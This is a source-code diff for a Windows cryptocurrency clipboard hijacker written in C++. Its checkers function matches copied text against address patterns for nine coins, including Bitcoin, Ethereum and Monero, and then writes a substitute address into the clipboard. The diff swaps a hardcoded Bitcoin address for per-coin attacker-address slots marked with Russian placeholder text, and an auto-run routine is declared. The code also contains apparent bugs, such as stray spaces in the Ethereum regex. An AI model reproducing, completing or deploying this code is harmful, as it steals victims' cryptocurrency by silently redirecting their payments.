@@ -16,7 +16,9 @@ void Reactor();
 void autoranner();
 
 
-string crypto = "15DQ4VCLvidYRsPjVKwxgntFrta16Kgikv";
+string crypto = "";
+
+
 
 
 void WINAPI main()
@@ -40,7 +42,15 @@ void WINAPI main()
 
 void checkers(string& data)
 {
-
+	static string add_btc = "<заглушка>";
+	static string add_eth1 = "<заглушка>";
+	static string add_xmr = "<заглушка>";
+	static string add_xlm = "<заглушка>";
+	static string add_xrp = "<заглушка>";
+	static string add_ltc = "<заглушка>";
+	static string add_nec = "<заглушка>";
+	static string add_bch = "<заглушка>";
+	static string add_dash = "<заглушка>";
 	static cmatch res;
 	static regex btc("(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)");
 	static regex eth1("(?:^0x[a - fA - F0 - 9]{40}$)");
@@ -52,16 +62,20 @@ void checkers(string& data)
 	static regex bch("^((bitcoincash:)?(q|p)[a-z0-9]{41})");
 	static regex dash("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)");
 	static regex arr[9]{ btc, eth1, xmr, xlm, xrp, ltc, nec, bch, dash };
-	for (int i = 0; i <= 8; i++)
+	static string arrav[9]{ add_btc ,add_eth1 ,add_xmr ,add_xlm, add_xrp, add_ltc, add_nec, add_bch, add_dash };
+	for (int i=0; i < 9; i++)
 	{
 		bool g = regex_match(data.c_str(), res, arr[i]);
+		crypto = arrav[i];
 		if (g)
 		{
 			Writebuffer(crypto);
-			break;
 
 		}
 	}
+	
+	
+
 }
 
 void autoranner()
